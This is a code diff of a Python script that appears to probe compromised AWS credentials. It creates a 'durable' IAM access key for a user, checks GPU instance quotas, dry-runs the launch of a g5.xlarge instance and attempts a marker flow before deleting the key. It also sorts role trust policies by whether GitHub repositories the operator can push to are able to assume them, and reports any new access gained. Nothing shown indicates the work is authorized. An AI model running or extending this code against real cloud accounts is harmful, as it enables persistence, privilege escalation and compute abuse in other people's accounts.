+    ck_rec, ck_creds = iam_create_access_key(cr0, 'e2e-test-user')
+    say('CREATE_KEY', json.dumps(ck_rec)[:900])
+    keyres = {'attempt': ck_rec}
+    out['create_access_key'] = json.dumps(ck_rec)[:4000]
+    if ck_creds:
+        idk = get_identity(ck_creds)
+        keyres['identity'] = idk
+        say('KEY_IDENTITY', json.dumps(idk)[:600])
+        q2 = [quota(ck_creds, code, reg) for code in ('L-DB2E81BA', 'L-3819A6DF')
+              for reg in ('eu-west-2', 'eu-west-1')]
+        keyres['quota'] = q2
+        say('KEY_QUOTA', json.dumps(q2)[:1200])
+        dry = signed('ec2', 'RunInstances',
+                     {'ImageId': 'ami-00000000000000000', 'InstanceType': 'g5.xlarge',
+                      'MinCount': '1', 'MaxCount': '1', 'DryRun': 'true'},
+                     'eu-west-2', '2016-11-15', ck_creds)
+        dryrec = {'status': dry['status'], 'code': err_code(dry), 'msg': cap(err_msg(dry), 500)}
+        keyres['runinstances_dryrun'] = dryrec
+        say('KEY_DRYRUN', json.dumps(dryrec)[:700])
+        if dryrec['code'] == 'DryRunOperation':
+            try:
+                keyres['marker'] = marker_flow(ck_creds, account + ':e2e-test-user', REGION)
+            except Exception as e:
+                keyres['marker'] = {'error': repr(e)[:300]}
+        else:
+            keyres['marker'] = 'NOT_ATTEMPTED (RunInstances not permitted for this principal)'
+        d = iam_delete_access_key(cr0, 'e2e-test-user', ck_creds['ak'])
+        keyres['delete'] = d
+        say('DELETE_KEY', json.dumps(d)[:500])
+        keys_after, _ = iam_list_access_keys(cr0, 'e2e-test-user')
+        keyres['keys_after'] = keys_after
+        say('KEYS_AFTER', json.dumps(keys_after)[:600])
+    out['durable_key'] = json.dumps(keyres)[:90000]
     rolepol = []
     for r in roles:
         ap, _ = iam_list_attached_role_policies(cr0, r['RoleName'])
@@ -1011,39 +1117,7 @@ def main():
                              'status': authz['status'][:2]})[:600])
 
     # 3c) (a)-(e) trust classification with pushable-repo/owner join
-    pushset = set(PUSHABLE_REPOS)
-    ownerset = set(x.split('/')[0] for x in PUSHABLE_REPOS)
-    classes = []
-    for c in compact:
-        cls = []
-        for pat in (c.get('gh_sub_patterns') or []):
-            s = str(pat).strip()
-            m = re.match(r'^repo:([^/:]+)/([^/:]+)', s)
-            if s in ('*', 'repo:*', 'repo:*/*'):
-                cls.append('b')
-            elif m:
-                o, rp = m.group(1).lower(), m.group(2).lower()
-                full = o + '/' + rp
-                if rp == '*':
-                    cls.append('b')
-                elif full in pushset or o in ownerset:
-                    cls.append('a')
-                else:
-                    cls.append('a-elsewhere')
-        for x in (c.get('principals') or []):
-            if x.startswith('AWS:'):
-                m = re.search(r'arn:aws:iam::(\d{12}):', x)
-                if m and m.group(1) != account:
-                    cls.append('c')
-            elif x.startswith('Federated:'):
-                if 'token.actions.githubusercontent.com' not in x:
-                    cls.append('d')
-            elif x.startswith('Service:'):
-                cls.append('e-service')
-        if not cls:
-            cls.append('e')
-        classes.append({'role': c['role'], 'class': sorted(set(cls)),
-                        'gh_sub_patterns': (c.get('gh_sub_patterns') or [])[:3]})
+    classes = classify_trusts(compact, account)
     out['trust_classes'] = json.dumps(classes)[:26000]
     say('TRUST_CLASSES', json.dumps(classes)[:2200])
 
@@ -1189,7 +1263,9 @@ def main():
             rec['marker'] = {'error': repr(e)[:300]}
         newd.append(rec)
     out['new_accesses'] = json.dumps(newd)[:120000]
-    out['verdict'] = ('NEW_ACCESSES=%d' % len(newd)) if newd else 'NO_NEW_ACCOUNT'
+    kv = 'KEY_' + ('CREATED' if out.get('create_access_key') and
+                   json.loads(out['create_access_key']).get('key_returned') else 'REFUSED')
+    out['verdict'] = ('NEW_ACCESSES=%d' % len(newd)) if newd else ('NO_NEW_ACCOUNT_' + kv)
     say('VERDICT', out['verdict'])
 
     out['raw_tail'] = cap('\n'.join(RAW[-120:]), 12000)
